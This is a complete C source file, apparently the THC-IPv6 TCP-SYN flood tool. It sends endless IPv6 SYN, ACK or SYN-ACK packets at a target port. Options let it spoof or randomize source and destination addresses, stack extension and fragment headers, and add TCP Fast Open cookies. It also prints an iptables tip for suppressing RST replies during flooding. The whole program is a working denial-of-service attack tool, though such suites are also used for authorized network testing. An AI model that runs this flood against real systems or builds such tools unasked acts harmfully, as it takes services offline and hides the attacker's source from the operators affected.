#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <pcap.h>
#include "thc-ipv6.h"

void help(char *prg) {
  printf("%s %s (c) 2022 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf(
      "Syntax: %s [-aAcdDfrORS] [-i microsecond] [-m dstmac] [-p port] [-s "
      "sourceip6] interface target port\n\n",
      prg);
  printf("Options:\n");
  printf(" -i      sending interval of packets (in microseconds)\n");
  printf(" -a      add hop-by-hop header with router alert\n");
  printf(" -d      add destination header (can be set up to 64 times)\n");
  printf(
      " -f      add atomic fragmentation header (can be set up to 64 times)\n");
  printf(" -A      send TCP-ACK packets\n");
  printf(" -S      send TCP-SYN-ACK packets\n");
  printf(" -r      randomize the source from your /64 prefix\n");
  printf(" -R      randomize the source fully\n");
  printf(" -D      randomize the destination (treat as /64)\n");
  printf(" -O      add a TCP Fast Open cookie (SYN-only packets)\n");
  printf(" -m dstmac     use this destination mac address\n");
  printf(" -s sourceip6  use this as source IPv6 address\n");
  printf(" -p port       use fixed source port\n");
  printf(
      "\nFlood the target port with TCP-SYN packets. If you supply \"x\" as "
      "port, it\nis randomized.\n");
  exit(-1);
}

#define IDS_STRING 0xbebacefa

int main(int argc, char *argv[]) {
  char *         interface, *ptr, buf2[8], buf3[18];
  unsigned char *dst = NULL, *dstmac = NULL, *src = NULL, *srcmac = NULL,
                dmac[6];
  int i, type = TCP_SYN, alert = 0, randsrc = 0, randdst = 0, randsrcp = 1,
         randdstp = 0, dont_crc = 0, seq, do_dst = 0, do_frag = 0, fastopen = 0,
         olen = 0;
  unsigned char *    pkt = NULL;
  int                pkt_len = 0, count = 0;
  unsigned short int sport, port;
  int                msec = 0;

  if (argc < 3 || strncmp(argv[1], "-h", 2) == 0) help(argv[0]);

  srand(time(NULL) + getpid());
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  while ((i = getopt(argc, argv, "i:afAcrRs:DSp:m:dfO")) >= 0) {
    switch (i) {
      case 'i':
        msec = atoi(optarg);
        break;
      case 'a':
        alert = 8;
        break;
      case 'O':
        fastopen = 1;
        break;
      case 'A':
        type = TCP_ACK;
        break;
      case 'S':
        type = TCP_SYN + TCP_ACK;
        break;
      case 'c':
        dont_crc = IDS_STRING;
        break;
      case 'm':
        sscanf(optarg, "%x:%x:%x:%x:%x:%x", (unsigned int *)&dmac[0],
               (unsigned int *)&dmac[1], (unsigned int *)&dmac[2],
               (unsigned int *)&dmac[3], (unsigned int *)&dmac[4],
               (unsigned int *)&dmac[5]);
        dstmac = dmac;
        break;
      case 'r':
        randsrc = 8;
        break;
      case 'R':
        randsrc = 1;
        break;
      case 'D':
        randdst = 8;
        break;
      case 'p':
        sport = atoi(optarg);
        randsrcp = 0;
        break;
      case 's':
        src = thc_resolve6(optarg);
        break;
      case 'd':
        do_dst++;
        break;
      case 'f':
        do_frag++;
        break;
      default:
        fprintf(stderr, "Error: unknown option -%c\n", i);
        exit(-1);
    }
  }

  if (argc - optind < 3) help(argv[0]);

  interface = argv[optind];

  if ((ptr = index(argv[optind + 1], '/')) != NULL) *ptr = 0;
  if ((dst = thc_resolve6(argv[optind + 1])) == NULL) {
    fprintf(stderr, "Error: Can not resolve %s\n", argv[optind + 1]);
    exit(-1);
  }

  if (strcasecmp(argv[optind + 2], "x") == 0)
    randdstp = 1;
  else
    port = atoi(argv[optind + 2]);

  if ((srcmac = thc_get_own_mac(interface)) == NULL) {
    fprintf(stderr, "Error: invalid interface %s\n", interface);
    exit(-1);
  }

  if (src == NULL)
    if ((src = thc_get_own_ipv6(interface, dst, PREFER_GLOBAL)) == NULL) {
      fprintf(stderr, "Error: no IPv6 address configured on interface %s\n",
              interface);
      exit(-1);
    }
  if (src[0] >= 0xfe && dst[0] < 0xfe) {
    fprintf(stderr,
            "Error: link local address on interface, destination however is "
            "remote\n");
    exit(-1);
  }

  if (dstmac == NULL) {
    if ((dstmac = thc_get_mac(interface, src, dst)) == NULL) {
      fprintf(stderr, "Error: can not find a route to target %s\n", argv[2]);
      exit(-1);
    }
  }

  memset(buf2, 0, sizeof(buf2));
  buf2[0] = 5;
  buf2[1] = 2;

  if (fastopen) {
    buf3[0] = 22;
    buf3[1] = 18;
    memcpy(buf3 + 2, dst, 16);
    olen = 18;
  }

  printf(
      "Starting to flood target network with TCP%s%s %s (Press Control-C to "
      "end, a dot is printed for every 1000 packets):\n",
      (type & TCP_SYN) > 0 ? "-SYN" : "", (type & TCP_ACK) > 0 ? "-ACK" : "",
      interface);
  if (type == TCP_SYN)
    printf(
        "Remember to filter outgoing RST packets for SYN flooding, e.g. "
        "iptables -I OUTPUT -p tcp --tcp-flags RST RST -j DROP\n");
  while (1) {
    if (randsrc) {
      for (i = randsrc; i < 16; i++)
        src[i] = rand() % 256;
    }
    if (randdst) {
      for (i = randdst; i < 16; i++)
        dst[i] = rand() % 256;
    }
    if (randsrcp) sport = rand() % 65536;
    if (randdstp) port = rand() % 65536;
    seq = rand();

    if ((pkt = thc_create_ipv6_extended(interface, PREFER_GLOBAL, &pkt_len, src,
                                        dst, 255, 0, 0, 0, 0)) == NULL)
      return -1;
    if (alert) {
      if (thc_add_hdr_hopbyhop(pkt, &pkt_len, buf2, 6) < 0) return -1;
    }
    if (do_dst) {
      if (do_dst > (thc_get_mtu(interface) - 40 - alert - 24) / 8)
        do_dst = (thc_get_mtu(interface) - 40 - alert - 24) / 8;
      memset(buf2, 0, sizeof(buf2));
      for (i = 0; i < do_dst; i++)
        if (thc_add_hdr_dst(pkt, &pkt_len, buf2, 6) < 0) return -1;
    }
    if (do_frag) {
      if (do_frag > (thc_get_mtu(interface) - 40 - alert - 24) / 8)
        do_frag = (thc_get_mtu(interface) - 40 - alert - 24) / 8;
      memset(buf2, 0, sizeof(buf2));
      for (i = 0; i < do_dst; i++)
        if (thc_add_hdr_oneshotfragment(pkt, &pkt_len, getpid() + i) < 0)
          return -1;
    }
    if (thc_add_tcp(pkt, &pkt_len, sport, port, seq, 0, type, 0x3840, 0, buf3,
                    olen, NULL, 0) < 0)
      return -1;
    if (thc_generate_pkt(interface, srcmac, dstmac, pkt, &pkt_len) < 0)
      return -1;

    while (thc_send_pkt(interface, pkt, &pkt_len) < 0)
      usleep(1);

    pkt = thc_destroy_packet(pkt);

    count++;
    if (count % 1000 == 0) printf(".");
    if (msec != 0) usleep(msec);
  }
  return 0;
}
